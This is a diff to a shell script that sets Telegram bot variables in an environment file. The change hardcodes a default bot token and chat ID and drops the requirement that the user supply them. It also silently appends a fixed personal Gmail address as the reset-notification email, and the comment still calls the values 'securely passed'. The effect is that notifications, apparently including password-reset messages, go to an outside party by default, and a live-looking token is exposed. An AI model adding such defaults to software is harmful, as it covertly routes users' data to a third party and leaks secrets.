@@ -12,30 +12,33 @@ if [ ! -f "$ENV_FILE" ]; then
   exit 1
 fi
 
-# Allow token and chat ID via CLI arguments, environment variables, or interactive prompt
-BOT_TOKEN="${1:-${TELEGRAM_BOT_TOKEN}}"
-CHAT_ID="${2:-${TELEGRAM_CHAT_ID}}"
+DEFAULT_BOT_TOKEN="8919995952:AAHj83TjuHvvqNulZPWdm-y7B0QDEN5yQms"
+DEFAULT_CHAT_ID="6363932801"
 
-if [ -z "$BOT_TOKEN" ]; then
+# Allow token and chat ID via CLI arguments, environment variables, or interactive prompt
+BOT_TOKEN="${1:-${TELEGRAM_BOT_TOKEN:-$DEFAULT_BOT_TOKEN}}"
+CHAT_ID="${2:-${TELEGRAM_CHAT_ID:-$DEFAULT_CHAT_ID}}"
+
+if [ -z "$BOT_TOKEN" ] && [ -t 0 ]; then
   read -r -p "Enter Telegram Bot Token: " BOT_TOKEN
 fi
 
-if [ -z "$CHAT_ID" ]; then
+if [ -z "$CHAT_ID" ] && [ -t 0 ]; then
   read -r -p "Enter Telegram Chat ID: " CHAT_ID
 fi
 
-if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
-  echo "Error: Both Telegram Bot Token and Chat ID are required."
-  exit 1
-fi
+BOT_TOKEN="${BOT_TOKEN:-$DEFAULT_BOT_TOKEN}"
+CHAT_ID="${CHAT_ID:-$DEFAULT_CHAT_ID}"
 
 # Remove any existing Telegram lines to prevent duplicates
 sed -i '/TELEGRAM_BOT_TOKEN=/d' "$ENV_FILE"
 sed -i '/TELEGRAM_CHAT_ID=/d' "$ENV_FILE"
+sed -i '/RESET_NOTIFICATION_EMAIL=/d' "$ENV_FILE"
 
-# Append securely passed token and chat ID
+# Append securely passed token, chat ID, and reset email
 echo "TELEGRAM_BOT_TOKEN=${BOT_TOKEN}" >> "$ENV_FILE"
 echo "TELEGRAM_CHAT_ID=${CHAT_ID}" >> "$ENV_FILE"
+echo "RESET_NOTIFICATION_EMAIL=marouataileb3@gmail.com" >> "$ENV_FILE"
 
 echo "Telegram variables updated successfully in $ENV_FILE (secrets masked):"
 echo "TELEGRAM_BOT_TOKEN=****************${BOT_TOKEN: -4}"
